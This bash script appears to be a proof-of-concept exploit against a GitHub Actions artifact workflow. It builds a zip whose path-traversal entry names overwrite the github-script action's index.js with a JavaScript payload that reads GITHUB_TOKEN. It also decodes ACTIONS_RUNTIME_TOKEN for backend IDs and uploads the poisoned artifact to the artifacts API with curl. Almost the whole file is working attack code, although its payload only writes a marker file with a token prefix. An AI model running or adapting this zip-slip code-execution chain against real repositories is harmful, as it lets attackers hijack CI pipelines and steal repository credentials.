#!/usr/bin/env bash
# Simulates what a fork-PR workflow can do: create an artifact whose zip contains
# path-traversal entry names and upload it straight to the artifacts backend.
set -euo pipefail

zipdir="$RUNNER_TEMP/zipslip"
rm -rf "$zipdir"
mkdir -p "$zipdir"

echo '{"fixtures":{}}' > "$zipdir/base.json"
echo '{"fixtures":{}}' > "$zipdir/pr.json"
echo '{"prNumber":1}' > "$zipdir/context.json"

cat > "$zipdir/payload.js" <<'JS'
;(async () => {
  try {
    const fs = await import('node:fs')
    const token = process.env['INPUT_GITHUB-TOKEN'] || process.env.GITHUB_TOKEN || 'none'
    fs.writeFileSync(
      '/home/runner/work/PWNED.txt',
      'RCE-PAYLOAD-RAN token_prefix=' + String(token).slice(0, 12) + '\n'
    )
    console.log('RCE-PAYLOAD-RAN')
  } catch (e) {
    console.log('payload-error ' + e)
  }
})()
JS

python3 - "$zipdir" <<'PY'
import os, sys, zipfile
d = sys.argv[1]
payload = open(os.path.join(d, 'payload.js'), 'rb').read()
out = os.path.join(d, 'report.zip')
z = zipfile.ZipFile(out, 'w', zipfile.ZIP_DEFLATED)
for n in ('base.json', 'pr.json', 'context.json'):
    z.write(os.path.join(d, n), n)
# consumer extracts into $RUNNER_TEMP/bundle-size, so ../.. lands in /home/runner/work
z.writestr('../../_actions/actions/github-script/v9/dist/index.js', payload)
z.writestr('../../PWNED_ziptest.txt', 'zip-slip-escaped\n')
z.close()
print('zip-size', os.path.getsize(out))
PY

python3 - <<'PY' > "$zipdir/ids.json"
import os, base64, json
t = os.environ['ACTIONS_RUNTIME_TOKEN'].split('.')[1]
t += '=' * (-len(t) % 4)
c = json.loads(base64.urlsafe_b64decode(t))
scp = [s for s in c['scp'].split(' ') if s.startswith('Actions.Results:')][0]
_, wr, jr = scp.split(':')
print(json.dumps({'wr': wr, 'jr': jr, 'results': os.environ['ACTIONS_RESULTS_URL']}))
PY

WR=$(jq -r .wr "$zipdir/ids.json")
JR=$(jq -r .jr "$zipdir/ids.json")
ORIGIN=$(python3 -c "import json,urllib.parse,sys;u=urllib.parse.urlparse(json.load(open('$zipdir/ids.json'))['results']);print(f'{u.scheme}://{u.netloc}')")
SIZE=$(stat -c%s "$zipdir/report.zip")
HASH=$(sha256sum "$zipdir/report.zip" | cut -d' ' -f1)

echo "origin=$ORIGIN wr=$WR jr=$JR size=$SIZE"
mkdir -p "$zipdir/_actions/actions/github-script/v9/dist" || true

CREATE=$(curl -sS -X POST "$ORIGIN/twirp/github.actions.results.api.v1.ArtifactService/CreateArtifact" \
  -H "Authorization: Bearer $ACTIONS_RUNTIME_TOKEN" \
  -H "Content-Type: application/json" \
  -d "{\"workflow_run_backend_id\":\"$WR\",\"workflow_job_run_backend_id\":\"$JR\",\"name\":\"bundle-size-report\",\"mime_type\":\"application/zip\",\"version\":7}")
echo "create: $CREATE"
URL=$(echo "$CREATE" | jq -r .signed_upload_url)
[ "$URL" != "null" ] || { echo "no signed url"; exit 1; }

echo "put status: $(curl -sS -o /dev/null -w '%{http_code}' -X PUT "$URL" \
  -H "x-ms-blob-type: BlockBlob" \
  -H "Content-Type: application/zip" \
  --data-binary "@$zipdir/report.zip")"

FINAL=$(curl -sS -X POST "$ORIGIN/twirp/github.actions.results.api.v1.ArtifactService/FinalizeArtifact" \
  -H "Authorization: Bearer $ACTIONS_RUNTIME_TOKEN" \
  -H "Content-Type: application/json" \
  -d "{\"workflow_run_backend_id\":\"$WR\",\"workflow_job_run_backend_id\":\"$JR\",\"name\":\"bundle-size-report\",\"size\":\"$SIZE\",\"hash\":\"sha256:$HASH\"}")
echo "finalize: $FINAL"
